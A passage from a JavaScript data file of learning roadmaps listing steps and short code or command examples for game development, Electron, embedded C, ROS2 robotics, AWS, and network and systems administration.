                            { id: "gd-10", title: "Input System", description: "New Unity Input System for controls.", example: "playerInput.actions['Jump'].performed += ctx => Jump();" },
                            { id: "gd-11", title: "Raycasting", description: "Detecting objects in the world.", example: "Physics.Raycast(transform.position, Vector3.forward, out hit, range);" },
                            { id: "gd-12", title: "Scene Management", description: "Loading and managing scenes.", example: "SceneManager.LoadScene(\"Level2\");" },
                            { id: "gd-13", title: "PlayerPrefs & Save Systems", description: "Persisting game data.", example: "PlayerPrefs.SetInt(\"HighScore\", 1000); PlayerPrefs.Save();" },
                            { id: "gd-14", title: "Time & Delta Time", description: "Frame-rate independent movement.", example: "transform.position += velocity * Time.deltaTime;" },
                            { id: "gd-15", title: "Math for Games", description: "Lerp, Slerp, dot and cross products, Quaternions.", example: "Vector3.Lerp(a, b, t); Quaternion.Slerp(q1, q2, t);" },
                            { id: "gd-16", title: "Finite State Machines", description: "Managing character states (Idle, Run, Jump, Attack).", example: "if (state == State.Jump && grounded) state = State.Idle;" },
                            { id: "gd-17", title: "Scriptable Objects", description: "Data containers decoupled from scenes.", example: "[CreateAssetMenu] public class WeaponData : ScriptableObject { public int damage; }" },
                            { id: "gd-18", title: "C++ Basics (for Unreal)", description: "Pointers, RAII, Unreal macros.", example: "UPROPERTY(EditAnywhere) float Speed = 600.f;" },
                            { id: "gd-19", title: "Game Math (Bezier Curves)", description: "Smooth paths and camera motions.", example: "P = (1-t)^2 * P0 + 2(1-t)*t * P1 + t^2 * P2" },
                            { id: "gd-20", title: "Version Control for Games", description: "Git with LFS for large game assets.", example: "git lfs track '*.png'; git lfs track '*.fbx'" }
                        ]
                    },
                    {
                        id: "gd-2", title: "Game Design Fundamentals",
                        steps: [
                            { id: "gd-gd-1", title: "Game Design Document (GDD)", description: "Defining game vision before coding.", example: "Genre, mechanics, story, target platform, controls, monetization." },
                            { id: "gd-gd-2", title: "Game Loops", description: "Core cycle that keeps players engaged.", example: "Shoot → Hit → Score → Upgrade → Harder enemies → repeat." },
                            { id: "gd-gd-3", title: "Player Psychology", description: "Flow state, reward loops, intrinsic motivation.", example: "Doom loop and hope loop in gacha games." },
                            { id: "gd-gd-4", title: "Level Design Principles", description: "Guiding the player through challenge progression.", example: "Introduce a mechanic safely, then test it in danger, then combine it." },
                            { id: "gd-gd-5", title: "Prototyping", description: "Fast early testing of game mechanics.", example: "Paper prototype before coding; Grey-box before full art pass." },
                            { id: "gd-gd-6", title: "Camera Systems", description: "Follow cams, cinematic cams, FPS cams.", example: "Cinemachine Virtual Camera in Unity." },
                            { id: "gd-gd-7", title: "Game Balancing", description: "Tuning difficulty to match player skill.", example: "Dynamic difficulty adjustment: increase speed if win rate > 80%." },
                            { id: "gd-gd-8", title: "UI/UX in Games", description: "HUDs, menus, health bars, minimaps.", example: "Unity Canvas, Unreal UMG Widget Blueprints." },
                            { id: "gd-gd-9", title: "Narrative & Storytelling", description: "Character arcs, world building, dialogue trees.", example: "Ink scripting language for interactive narrative." },
                            { id: "gd-gd-10", title: "Procedural Generation", description: "Algorithmically generated levels and content.", example: "Perlin noise for terrain; dungeon roomfitting algorithm." },
                            { id: "gd-gd-11", title: "Particle Systems", description: "Visual effects: fire, dust, magic, explosions.", example: "Unity VFX Graph; Unreal Niagara system." },
                            { id: "gd-gd-12", title: "Animation Systems", description: "Animator Controller, blend trees, IK.", example: "Animator.SetBool(\"isRunning\", true);" },
                            { id: "gd-gd-13", title: "AI & Pathfinding", description: "NavMesh, A*, behavior trees.", example: "agent.SetDestination(target.position);" },
                            { id: "gd-gd-14", title: "Sound Design", description: "SFX, ambient audio, dynamic music.", example: "AudioSource.PlayOneShot(jumpClip); FMOD integration." },
                            { id: "gd-gd-15", title: "Multiplayer Basics", description: "Netcode, latency, rollback networking.", example: "Unity Netcode for GameObjects; Mirror." },
                            { id: "gd-gd-16", title: "Monetization Models", description: "Premium, F2P, ads, DLC, subscription.", example: "Apple/Google IAP APIs; Unity IronSource for ads." },
                            { id: "gd-gd-17", title: "Publishing on Steam", description: "Steamworks SDK, store page, Greenlight.", example: "Build → Upload via SteamPipe → Set pricing → Launch." },
                            { id: "gd-gd-18", title: "Mobile Publishing (iOS/Android)", description: "App Store, Play Store submission.", example: "Unity Build Settings → Android → Generate APK/AAB." },
                            { id: "gd-gd-19", title: "Game Analytics", description: "Tracking player behavior to improve design.", example: "Unity Analytics, Firebase, custom event tracking." },
                            { id: "gd-gd-20", title: "Post-Launch Support", description: "Patches, DLC, community engagement.", example: "Monitor reviews, fix critical bugs within 48hr, seasonal events." }
                        ]
                    }
                ],
                project: "Build a complete 2D platformer game with enemies, collectibles, sounds, and a main menu."
            }
        ]
    },
    desktop: {
        title: "Desktop App Development Roadmap",
        stages: [
            {
                title: "Desktop Foundations",
                modules: [
                    {
                        id: "da-1", title: "Electron.js (Cross-Platform)",
                        steps: [
                            { id: "da-1", title: "Node.js Basics", description: "File system, events, modules, npm.", example: "const fs = require('fs'); fs.readFileSync('data.json', 'utf8')" },
                            { id: "da-2", title: "Electron Architecture", description: "Main process, renderer process, IPC.", example: "ipcMain.handle('read-file', async () => fs.readFileSync(path, 'utf8'))" },
                            { id: "da-3", title: "Creating Windows", description: "BrowserWindow options: size, frame, transparency.", example: "new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true } })" },
                            { id: "da-4", title: "Preload Scripts", description: "Secure bridge between main and renderer.", example: "contextBridge.exposeInMainWorld('api', { readFile: () => ipcRenderer.invoke('read-file') })" },
                            { id: "da-5", title: "File System Access", description: "Reading and writing local files.", example: "const data = fs.readFileSync('/path/to/file', 'utf8'); fs.writeFileSync(path, content)" },
                            { id: "da-6", title: "Native Dialogs", description: "File picker, message boxes.", example: "dialog.showOpenDialog({ properties: ['openFile', 'multiSelections'] })" },
                            { id: "da-7", title: "System Tray", description: "Running in the background with tray icon.", example: "new Tray(iconPath); tray.setContextMenu(menu);" },
                            { id: "da-8", title: "Notifications", description: "Desktop notifications.", example: "new Notification({ title: 'Reminder', body: 'Check your tasks!' }).show()" },
                            { id: "da-9", title: "Auto Updater (electron-updater)", description: "OTA updates for desktop apps.", example: "autoUpdater.checkForUpdatesAndNotify();" },
                            { id: "da-10", title: "Packaging (electron-builder)", description: "Building installers for Windows, Mac, Linux.", example: "electron-builder --win --mac --linux" },
                            { id: "da-11", title: "Security Best Practices", description: "CSP, contextIsolation, nodeIntegration: false.", example: "webPreferences: { contextIsolation: true, nodeIntegration: false }" },
                            { id: "da-12", title: "Native Node Modules", description: "Using compiled C++ addons (better-sqlite3, sharp).", example: "const Database = require('better-sqlite3'); const db = new Database('app.db');" },
                            { id: "da-13", title: "SQLite for Local Storage", description: "Embedded database for desktop apps.", example: "db.prepare('INSERT INTO notes VALUES (?)').run(content);" },
                            { id: "da-14", title: "React/Vue in Electron", description: "Using web frameworks for the UI layer.", example: "Vite + React inside Electron renderer process." },
                            { id: "da-15", title: "Deep Links", description: "myapp:// protocol URLs to open the app.", example: "app.setAsDefaultProtocolClient('myapp');" },
                            { id: "da-16", title: "Clipboard API", description: "Read/write system clipboard.", example: "clipboard.writeText('Hello!'); clipboard.readText()" },
                            { id: "da-17", title: "Power Monitor", description: "Detecting sleep/wake/locked events.", example: "powerMonitor.on('suspend', () => saveState());" },
                            { id: "da-18", title: "Crash Reporter", description: "Automatic crash reporting.", example: "crashReporter.start({ submitURL: 'https://crashes.example.com' })" },
                            { id: "da-19", title: "Performance Profiling", description: "Using Chrome DevTools for renderer optimization.", example: "Open DevTools: Ctrl+Shift+I in Electron window." },
                            { id: "da-20", title: "Publishing to Microsoft Store / Mac App Store", description: "Building signed, sandboxed packages.", example: "electron-builder --win appx; code signing with .p12 cert." }
                        ]
                    }
                ],
                project: "Build a cross-platform Markdown editor with file open/save, syntax highlighting, and live preview using Electron + React."
            }
        ]
    },
    embedded: {
        title: "Embedded Systems Roadmap",
        stages: [
            {
                title: "Electronics & C Programming",
                modules: [
                    {
                        id: "emb-1", title: "C for Embedded Systems",
                        steps: [
                            { id: "emb-c-1", title: "C Syntax & Data Types", description: "uint8_t, uint16_t, size_t — fixed-width types.", example: "#include <stdint.h>; uint8_t led_state = 0;" },
                            { id: "emb-c-2", title: "Pointers & Memory", description: "Dereferencing, pointer arithmetic, memory-mapped I/O.", example: "volatile uint32_t *reg = (uint32_t *)0x40021000; *reg |= (1 << 5);" },
                            { id: "emb-c-3", title: "Bit Manipulation", description: "Setting, clearing, toggling register bits.", example: "GPIOA->ODR |= (1 << 5); GPIOA->ODR &= ~(1 << 5);" },
                            { id: "emb-c-4", title: "Structs & Unions", description: "Packing hardware register maps.", example: "typedef struct { uint8_t hour; uint8_t min; uint8_t sec; } Time_t;" },
                            { id: "emb-c-5", title: "Volatile Keyword", description: "Preventing compiler optimisation of hardware registers.", example: "volatile uint8_t flag = 0; // Checked in ISR" },
                            { id: "emb-c-6", title: "Interrupt Service Routines (ISR)", description: "Handling hardware events asynchronously.", example: "void EXTI0_IRQHandler(void) { flag = 1; EXTI->PR |= 1; }" },
                            { id: "emb-c-7", title: "Linker Scripts & Memory Map", description: "Placing code and data in correct flash/RAM sections.", example: "MEMORY { FLASH(rx) : ORIGIN = 0x08000000, LENGTH = 256K }" },
                            { id: "emb-c-8", title: "Dynamic Memory (Avoiding malloc)", description: "Static allocation in embedded systems.", example: "Use static arrays: static uint8_t buf[128]; instead of malloc." },
                            { id: "emb-c-9", title: "Compilation & Toolchain", description: "GCC arm-none-eabi, objcopy, size.", example: "arm-none-eabi-gcc -mcpu=cortex-m4 ... -o app.elf" },
                            { id: "emb-c-10", title: "CMake for Embedded", description: "Cross-compilation build system.", example: "set(CMAKE_C_COMPILER arm-none-eabi-gcc)" },
                            { id: "emb-c-11", title: "Debugging with GDB + OpenOCD", description: "On-chip debugging via JTAG/SWD.", example: "openocd -f interface/stlink.cfg -f target/stm32f4x.cfg" },
                            { id: "emb-c-12", title: "Basic Electronics", description: "Ohm's law, voltage dividers, pull-up/down resistors.", example: "V = I × R; 10kΩ pull-up to VCC on a switch." },
                            { id: "emb-c-13", title: "Digital I/O (GPIO)", description: "Configuring pins as input/output.", example: "HAL_GPIO_WritePin(GPIOA, GPIO_PIN_5, GPIO_PIN_SET);" },
                            { id: "emb-c-14", title: "Analog (ADC/DAC)", description: "Reading sensors and generating analog signals.", example: "HAL_ADC_Start(&hadc1); HAL_ADC_GetValue(&hadc1);" },
                            { id: "emb-c-15", title: "Timers & PWM", description: "Periodic events, motor control, dimming LEDs.", example: "htim2.Instance->CCR1 = dutyCycle; HAL_TIM_PWM_Start(&htim2, TIM_CHANNEL_1);" },
                            { id: "emb-c-16", title: "UART Communication", description: "Serial port for debug output and data exchange.", example: "HAL_UART_Transmit(&huart2, (uint8_t*)\"Hello\\r\\n\", 7, HAL_MAX_DELAY);" },
                            { id: "emb-c-17", title: "I2C Protocol", description: "Multi-device bus for sensors/displays.", example: "HAL_I2C_Master_Transmit(&hi2c1, 0x3C << 1, data, len, HAL_MAX_DELAY);" },
                            { id: "emb-c-18", title: "SPI Protocol", description: "High-speed peripheral communication.", example: "HAL_SPI_TransmitReceive(&hspi1, txBuf, rxBuf, 1, HAL_MAX_DELAY);" },
                            { id: "emb-c-19", title: "FreeRTOS Basics", description: "Tasks, queues and RTOS scheduling.", example: "xTaskCreate(blinkTask, \"Blink\", 128, NULL, 1, NULL); vTaskDelay(pdMS_TO_TICKS(500));" },
                            { id: "emb-c-20", title: "Low Power Modes", description: "Sleep, stop, standby modes for battery efficiency.", example: "HAL_PWR_EnterSLEEPMode(PWR_MAINREGULATOR_ON, PWR_SLEEPENTRY_WFI);" }
                        ]
                    }
                ],
                project: "Build a digital weather station: read temperature/humidity (DHT22), display on OLED (I2C), log to SD card (SPI), and send over UART."
            }
        ]
    },
    robotics: {
        title: "Robotics Roadmap",
        stages: [
            {
                title: "Robotics Foundations",
                modules: [
                    {
                        id: "rob-1", title: "Programming & Mathematics",
                        steps: [
                            { id: "rob-1", title: "Python for Robotics", description: "NumPy, SciPy, Python scripting for automation.", example: "import numpy as np; T = np.eye(4)  # 4x4 homogeneous transformation" },
                            { id: "rob-2", title: "C++ for ROS2", description: "Publishers, subscribers, nodes in C++.", example: "auto pub = node->create_publisher<std_msgs::msg::String>(\"topic\", 10);" },
                            { id: "rob-3", title: "Linear Algebra", description: "Vectors, matrices, dot products, cross products.", example: "np.dot(R, p) + t  # Transform point p by rotation R and translation t" },
                            { id: "rob-4", title: "Rigid Body Transformations", description: "Translation, rotation, homogeneous coordinates.", example: "T = [[R, t],[0,0,0,1]]  # 4x4 pose matrix" },
                            { id: "rob-5", title: "Forward Kinematics", description: "Computing end-effector pose from joint angles.", example: "T_ee = T01 * T12 * T23  # Product of transforms" },
                            { id: "rob-6", title: "Inverse Kinematics", description: "Computing joint angles for a target pose.", example: "q = ikpy.chain.Chain.active_to_full(chain.inverse_kinematics([x,y,z]))" },
                            { id: "rob-7", title: "Motion Planning (A* / RRT)", description: "Finding paths in configuration space.", example: "rrt.plan(start=(0,0), goal=(5,5), obstacles=obstacles)" },
                            { id: "rob-8", title: "Control Theory Basics", description: "PID controllers for motor control.", example: "u = Kp*e + Ki*integral(e) + Kd*de/dt" },
                            { id: "rob-9", title: "Robot Operating System 2 (ROS2)", description: "Framework for robotics software.", example: "ros2 topic pub /cmd_vel geometry_msgs/msg/Twist '{linear: {x: 0.5}}'" },
                            { id: "rob-10", title: "ROS2 Nodes & Topics", description: "Publish/subscribe architecture.", example: "ros2 run turtlesim turtlesim_node; ros2 run turtlesim turtle_teleop_key" },
                            { id: "rob-11", title: "ROS2 Launch Files", description: "Starting multiple nodes.", example: "from launch import LaunchDescription; from launch_ros.actions import Node" },
                            { id: "rob-12", title: "Gazebo Simulation", description: "Simulating robots in 3D environments.", example: "ros2 launch gazebo_ros gazebo.launch.py; spawn robot URDF" },
                            { id: "rob-13", title: "URDF/XACRO", description: "Describing robot geometry and joints.", example: "<joint name='wheel_joint' type='continuous'><parent link='base'/><child link='wheel'/>" },
                            { id: "rob-14", title: "Sensor Integration", description: "LIDAR, camera, IMU data in ROS2.", example: "ros2 topic echo /scan  # LIDAR scan data" },
                            { id: "rob-15", title: "SLAM (Simultaneous Localization and Mapping)", description: "Building a map while localizing.", example: "slam_toolbox; Nav2 stack; cartographer-ros" },
                            { id: "rob-16", title: "Navigation Stack (Nav2)", description: "Autonomous navigation with path planning.", example: "ros2 launch nav2_bringup navigation_launch.py" },
                            { id: "rob-17", title: "Computer Vision (OpenCV)", description: "Object detection and tracking for robots.", example: "cv2.findContours(); cv2.drawContours(); HSV color segmentation." },
                            { id: "rob-18", title: "Reinforcement Learning for Robotics", description: "Training agents with rewards.", example: "OpenAI Gym + Stable Baselines3; MuJoCo simulation." },
                            { id: "rob-19", title: "Hardware Interfacing", description: "Connecting microcontrollers, servo motors, encoders.", example: "ros2_control; serial communication via pyserial." },
                            { id: "rob-20", title: "ROS2 TF2 Transforms", description: "Managing coordinate frames.", example: "tf2_ros.TransformBroadcaster; lookupTransform('map', 'base_link', ...)" }
                        ]
                    }
                ],
                project: "Build a ROS2-powered robot that navigates a Gazebo maze using SLAM, Nav2, and obstacle avoidance."
            }
        ]
    },
    cloudengineering: {
        title: "Cloud Engineering Roadmap",
        stages: [
            {
                title: "Cloud Foundations & Core Services",
                modules: [
                    {
                        id: "ce-1", title: "Cloud Fundamentals",
                        steps: [
                            { id: "ce-1", title: "What is Cloud Computing?", description: "IaaS, PaaS, SaaS models explained.", example: "EC2 = IaaS; Elastic Beanstalk = PaaS; Gmail = SaaS" },
                            { id: "ce-2", title: "AWS Core Compute (EC2)", description: "Launching and configuring virtual machines.", example: "aws ec2 run-instances --image-id ami-0abcd1234 --instance-type t3.micro" },
                            { id: "ce-3", title: "Object Storage (S3)", description: "Buckets, policies, versioning, lifecycle rules.", example: "aws s3 cp file.txt s3://mybucket/; aws s3 sync ./dist s3://mybucket/" },
                            { id: "ce-4", title: "IAM (Identity & Access Management)", description: "Users, roles, policies, least privilege.", example: "aws iam create-role --role-name LambdaExec --assume-role-policy-document file://trust.json" },
                            { id: "ce-5", title: "Virtual Private Cloud (VPC)", description: "Subnets, route tables, internet gateways, NAT.", example: "Public subnet → IGW → Internet; Private subnet → NAT → Internet." },
                            { id: "ce-6", title: "Security Groups & NACLs", description: "Stateful vs stateless firewall rules.", example: "Inbound: allow 443 from 0.0.0.0/0; Outbound: allow all." },
                            { id: "ce-7", title: "Elastic Load Balancing (ALB/NLB)", description: "Distributing traffic across instances.", example: "ALB routes by URL path; NLB routes by IP/port at L4." },
                            { id: "ce-8", title: "Auto Scaling Groups", description: "Automatic scale-out on load, scale-in when idle.", example: "Min: 2, Max: 10, desired: 2; CPU > 70% → scale out." },
                            { id: "ce-9", title: "RDS (Managed Databases)", description: "PostgreSQL, MySQL, Aurora in managed form.", example: "aws rds create-db-instance --engine postgres --db-instance-class db.t3.micro" },
                            { id: "ce-10", title: "ElastiCache (Redis/Memcached)", description: "In-memory caching for sessions and frequently read data.", example: "redis.set('user:1:session', token, ex=3600)" },
                            { id: "ce-11", title: "AWS Lambda & Event-Driven", description: "Serverless functions triggered by events.", example: "S3 PUT event → Lambda function → DynamoDB write." },
                            { id: "ce-12", title: "API Gateway", description: "Managed REST/WebSocket APIs.", example: "POST /orders → Lambda; GET /users/{id} → Lambda." },
                            { id: "ce-13", title: "CloudWatch Monitoring", description: "Metrics, logs, alarms, dashboards.", example: "aws cloudwatch put-metric-alarm --alarm-name CPU-High --threshold 80" },
                            { id: "ce-14", title: "CloudTrail & AWS Config", description: "Auditing API calls and resource configurations.", example: "Who deleted this S3 bucket? → CloudTrail lookup." },
                            { id: "ce-15", title: "Route 53 (DNS)", description: "Domain registration, routing policies (weighted, failover, geo).", example: "Weighted: 90% prod, 10% canary." },
                            { id: "ce-16", title: "CDN (CloudFront)", description: "Low-latency content distribution globally.", example: "CloudFront distribution → S3 origin; cache TTL = 86400." },
                            { id: "ce-17", title: "ECS & Fargate", description: "Running containers without managing EC2.", example: "aws ecs create-cluster --cluster-name prod; Fargate launch type." },
                            { id: "ce-18", title: "Secrets Manager & Parameter Store", description: "Storing sensitive configuration securely.", example: "aws secretsmanager get-secret-value --secret-id prod/db/password" },
                            { id: "ce-19", title: "Cost Optimization", description: "Reserved instances, Savings Plans, rightsizing, spot instances.", example: "Use spot for batch jobs; reserved for steady-state prod." },
                            { id: "ce-20", title: "AWS Certifications Path", description: "Cloud Practitioner → Architect → DevOps Pro.", example: "Start with AWS Cloud Practitioner exam." }
                        ]
                    }
                ],
                project: "Deploy a highly available three-tier web app on AWS: ALB → EC2 Auto Scaling → RDS Multi-AZ."
            }
        ]
    },
    networkadmin: {
        title: "Network Administration Roadmap",
        stages: [
            {
                title: "Network Fundamentals & Administration",
                modules: [
                    {
                        id: "na-1", title: "Networking & Protocol Fundamentals",
                        steps: [
                            { id: "na-1", title: "OSI Model in Practice", description: "Layer-by-layer troubleshooting approach.", example: "Can't ping? Check L1/L2/L3. Can't access web? Check L4/L7." },
                            { id: "na-2", title: "IPv4 Subnetting & CIDR", description: "Calculating network ranges, broadcast addresses.", example: "10.0.0.0/24 → 254 hosts; 10.0.0.0/28 → 14 hosts." },
                            { id: "na-3", title: "IPv6 Addressing", description: "128-bit addresses, abbreviation rules.", example: "2001:db8::1/64; fe80:: for link-local." },
                            { id: "na-4", title: "DNS Administration", description: "Zones, records, authoritative vs recursive resolvers.", example: "dig +trace google.com; A, AAAA, MX, CNAME, TXT records." },
                            { id: "na-5", title: "DHCP Management", description: "Leases, scopes, reservations, options.", example: "ip dhcp pool CORP; network 192.168.1.0 255.255.255.0; default-router 192.168.1.1" },
                            { id: "na-6", title: "Routing Protocols (OSPF, BGP)", description: "Dynamic routing between networks.", example: "router ospf 1; network 10.0.0.0 0.0.0.255 area 0" },
                            { id: "na-7", title: "VLANs & Inter-VLAN Routing", description: "Logical network segmentation.", example: "vlan 10 name SALES; interface g0/0.10 encapsulation dot1Q 10" },
                            { id: "na-8", title: "Spanning Tree Protocol (STP)", description: "Loop prevention in switched networks.", example: "spanning-tree mode rapid-pvst; show spanning-tree vlan 10" },
                            { id: "na-9", title: "Cisco IOS Basics", description: "CLI navigation, interface configuration, show commands.", example: "enable; configure terminal; interface g0/0; ip address 192.168.1.1 255.255.255.0" },
                            { id: "na-10", title: "Firewall Configuration", description: "ACLs, zones, NAT, stateful inspection.", example: "ip access-list extended BLACKLIST; deny tcp any host 192.168.1.100 eq 22" },
                            { id: "na-11", title: "VPN Setup (IPSec/SSL)", description: "Site-to-site and remote access VPNs.", example: "crypto isakmp policy 10; encryption aes 256; authentication pre-share" },
                            { id: "na-12", title: "Network Monitoring (SNMP/NetFlow)", description: "Polling device stats, flow analysis.", example: "snmpwalk -v2c -c public 192.168.1.1; ntopng for NetFlow." },
                            { id: "na-13", title: "Packet Analysis (Wireshark/tcpdump)", description: "Deep packet inspection and troubleshooting.", example: "tcpdump -i eth0 port 443 -w capture.pcap" },
                            { id: "na-14", title: "Quality of Service (QoS)", description: "Prioritizing voice/video traffic.", example: "mls qos; queue voice traffic at highest priority." },
                            { id: "na-15", title: "Wireless LAN (Wi-Fi 6)", description: "WPA3, SSID, channels, AP placement.", example: "2.4GHz (range) vs 5GHz (speed); channel bonding; WPA3-SAE." },
                            { id: "na-16", title: "Network Documentation", description: "Diagrams, IP schemas, change logs.", example: "Draw.io network topology; IP tracker spreadsheet." },
                            { id: "na-17", title: "Bandwidth Management", description: "Traffic shaping, policing, throttling.", example: "police rate 10000000 bps burst 1250000 byte; shape average 1Mbps" },
                            { id: "na-18", title: "Network Automation (Python)", description: "Automating config with Netmiko, NAPALM.", example: "from netmiko import ConnectHandler; net_connect.send_command('show ip int brief')" },
                            { id: "na-19", title: "SD-WAN", description: "Software-defined wide area networking.", example: "Cisco Viptela, VMware VeloCloud — centralized policy management." },
                            { id: "na-20", title: "Certifications Path", description: "CompTIA Network+ → CCNA → CCNP.", example: "CCNA covers routing, switching, security, automation." }
                        ]
                    }
                ],
                project: "Design and configure a multi-site office network: VLANs, inter-VLAN routing, site-to-site VPN, and monitoring."
            }
        ]
    },
    systemadmin: {
        title: "Systems Administration Roadmap",
        stages: [
            {
                title: "OS Administration & Server Management",
                modules: [
                    {
                        id: "sa-1", title: "Linux Server Administration",
                        steps: [
                            { id: "sa-1", title: "Linux Installation & Setup", description: "Ubuntu/CentOS/RHEL server installation, SSH access.", example: "sudo apt install openssh-server; systemctl enable sshd" },
                            { id: "sa-2", title: "User & Group Management", description: "adduser, passwd, usermod, /etc/sudoers.", example: "useradd -m -s /bin/bash john; usermod -aG sudo john" },
                            { id: "sa-3", title: "File System Management", description: "Mounting, fstab, LVM, disk partitioning.", example: "lsblk; mkfs.ext4 /dev/sdb; mount /dev/sdb /data; echo >> /etc/fstab" },
                            { id: "sa-4", title: "Process & Service Management", description: "systemd units, journalctl logs.", example: "systemctl status nginx; journalctl -u nginx -f; systemctl restart nginx" },
                            { id: "sa-5", title: "Network Configuration", description: "Static IPs, netplan, nmcli.", example: "netplan apply; nmcli connection modify eth0 ipv4.addresses 192.168.1.10/24" },
                            { id: "sa-6", title: "Package Management", description: "apt, yum, dnf, snap.", example: "apt install nginx; apt autoremove; dpkg -l | grep nginx" },
                            { id: "sa-7", title: "Bash Automation", description: "Scripts for backups, monitoring, updates.", example: "#!/bin/bash; tar -czf /backup/$(date +%F).tar.gz /var/www" },
                            { id: "sa-8", title: "Cron Jobs", description: "Scheduled task automation.", example: "0 3 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1" },
                            { id: "sa-9", title: "Web Server (Nginx/Apache)", description: "Virtual hosts, SSL/TLS, reverse proxying.", example: "server { listen 443 ssl; server_name app.com; ssl_certificate /etc/ssl/app.crt; }" },
                            { id: "sa-10", title: "Database Administration (MySQL/PostgreSQL)", description: "Install, backup, restore, user permissions.", example: "mysqldump -u root -p mydb > backup.sql; mysql < backup.sql" },
                            { id: "sa-11", title: "Security Hardening", description: "fail2ban, UFW, SSH keys, CIS benchmarks.", example: "ufw allow 22; ufw enable; fail2ban-client status sshd" },
                            { id: "sa-12", title: "Log Management (ELK/Loki)", description: "Centralizing and searching logs.", example: "filebeat → logstash → elasticsearch → kibana" },
                            { id: "sa-13", title: "Monitoring (Prometheus/Nagios)", description: "Server health dashboards and alerting.", example: "node_exporter; scrape_configs in prometheus.yml; alert on CPU > 90%." },
                            { id: "sa-14", title: "Backup & Recovery", description: "rsync, bacula, Amanda, cloud backups.", example: "rsync -avz --delete /data/ user@backup-host:/backups/data/" },
                            { id: "sa-15", title: "Windows Server Administration", description: "Active Directory, DNS, DHCP, Group Policy.", example: "New-ADUser -Name John -SamAccountName john -AccountPassword (Read-Host -AsSecureString)" },
                            { id: "sa-16", title: "Active Directory", description: "OUs, users, computers, group policies.", example: "Get-ADUser -Filter * -Properties * | Select Name,EmailAddress | Export-CSV users.csv" },
                            { id: "sa-17", title: "Virtualization (VMware/KVM)", description: "Hypervisors, VMs, snapshots, migration.", example: "virt-install --name myvm --vcpus 2 --memory 2048 --disk size=20" },
                            { id: "sa-18", title: "Configuration Management (Ansible/Chef)", description: "Automating server config at scale.", example: "ansible-playbook -i inventory.ini -l web-servers setup.yml" },
                            { id: "sa-19", title: "Patch Management", description: "Automated security updates, WSUS, unattended-upgrades.", example: "apt-get -y install unattended-upgrades; dpkg-reconfigure unattended-upgrades" },
                            { id: "sa-20", title: "Disaster Recovery Planning", description: "RTO/RPO, failover procedures, documentation.", example: "Test restore from backup monthly; document recovery steps." }
                        ]
                    }
                ],
                project: "Stand up a production-ready LAMP/LEMP stack with SSL, monitoring, log shipping, automated backups, and fail2ban."
            }
        ]
    },
    cloudarchitect: {
        title: "Cloud Architecture Roadmap",
        stages: [
            {
                title: "Architectural Design & Best Practices",
                modules: [
                    {
                        id: "ca-1", title: "Cloud Architecture Principles",
                        steps: [
                            { id: "ca-1", title: "AWS Well-Architected Framework", description: "6 pillars: Operational Excellence, Security, Reliability, Performance, Cost, Sustainability.", example: "Review each pillar against your workload." },
                            { id: "ca-2", title: "High Availability (HA)", description: "Multi-AZ deployments, active-passive, active-active.", example: "RDS Multi-AZ; EC2 ASG across 3 AZs." },
                            { id: "ca-3", title: "Fault Tolerance & Resiliency", description: "Designing for failures.", example: "Chaos engineering; Netflix Chaos Monkey." },
                            { id: "ca-4", title: "Scalability Patterns", description: "Horizontal vs vertical scaling, caching, CDN.", example: "Read replicas for DB; CloudFront for static; ElastiCache for sessions." },
                            { id: "ca-5", title: "Microservices Architecture", description: "Breaking monoliths into independent services.", example: "Order service ↔ Payment service ↔ Notification service via SQS." },
                            { id: "ca-6", title: "Event-Driven Architecture", description: "Async event processing with queues.", example: "SQS → Lambda → DynamoDB; SNS fan-out to multiple consumers." },
                            { id: "ca-7", title: "CQRS & Event Sourcing", description: "Separating read/write models.", example: "Write to command model; read from materialized view via events." },
                            { id: "ca-8", title: "API Design (REST, GraphQL, gRPC)", description: "Choosing the right API style for each use case.", example: "REST for CRUD; GraphQL for flexible queries; gRPC for internal services." },
                            { id: "ca-9", title: "Data Architecture", description: "Lakes, warehouses, lakehouses (S3 + Athena + Glue).", example: "Raw → Bronze → Silver → Gold data tiers." },
                            { id: "ca-10", title: "Database Selection", description: "SQL vs NoSQL vs NewSQL; use-case driven choice.", example: "DynamoDB for key-value; Aurora for relational; Redshift for analytics." },
                            { id: "ca-11", title: "Security Architecture", description: "Zero-trust, defense-in-depth, shared responsibility.", example: "VPC + SG + WAF + IAM + KMS + CloudTrail = defence layers." },
                            { id: "ca-12", title: "Networking Architecture", description: "Hub-spoke VPCs, Transit Gateway, PrivateLink.", example: "AWS Transit Gateway connects multiple VPCs and on-premises." },
                            { id: "ca-13", title: "Hybrid & Multi-Cloud", description: "Connecting on-premises to cloud, multi-cloud strategy.", example: "AWS Direct Connect for dedicated link; Azure ExpressRoute." },
                            { id: "ca-14", title: "Container Orchestration at Scale", description: "EKS, GKE, AKS for large container workloads.", example: "Spot nodegroups for non-critical; on-demand for prod." },
                            { id: "ca-15", title: "Observability Architecture", description: "Unified logs, metrics, traces.", example: "Datadog, New Relic, or open-source LGTM stack (Loki, Grafana, Tempo, Mimir)." },
                            { id: "ca-16", title: "Cost Architecture", description: "Tagging strategy, budget alerts, RI/SP planning.", example: "Enable AWS Cost Anomaly Detection; set $500 budget alert per team." },
                            { id: "ca-17", title: "DR Architecture (RTO/RPO)", description: "Backup-restore, pilot light, warm standby, multi-site.", example: "Pilot light: minimal resources in DR region, scale on failover." },
                            { id: "ca-18", title: "Compliance & Governance", description: "SOC2, GDPR, HIPAA on cloud.", example: "AWS Config rules for compliance; Service Control Policies in AWS Organizations." },
                            { id: "ca-19", title: "Architecture Review Process", description: "Design reviews, ADRs, threat modeling.", example: "Architecture Decision Record (ADR) template for each major decision." },
                            { id: "ca-20", title: "SA Certifications Path", description: "AWS SAA → SAP → Specialty.", example: "AWS Solutions Architect Associate → Professional." }
                        ]
                    }
                ],
                project: "Design and document a complete cloud architecture for a global SaaS product: multi-region, auto-scaling, DR plan, and security controls."
            }
        ]
    },
    itsupport: {
        title: "IT Support Roadmap",
        stages: [
            {
                title: "Technical Support & Troubleshooting",
                modules: [
                    {
                        id: "it-1", title: "Hardware, Software & Networking",
                        steps: [
                            { id: "it-1", title: "Troubleshooting Methodology", description: "Systematic approach: identify → research → test → implement → verify.", example: "OSI model approach: ping → traceroute → DNS → HTTP." },
                            { id: "it-2", title: "Hardware Diagnostics", description: "RAM, HDD, CPU, GPU testing tools.", example: "MemTest86 for RAM; CrystalDiskInfo for drives; HWiNFO for temps." },
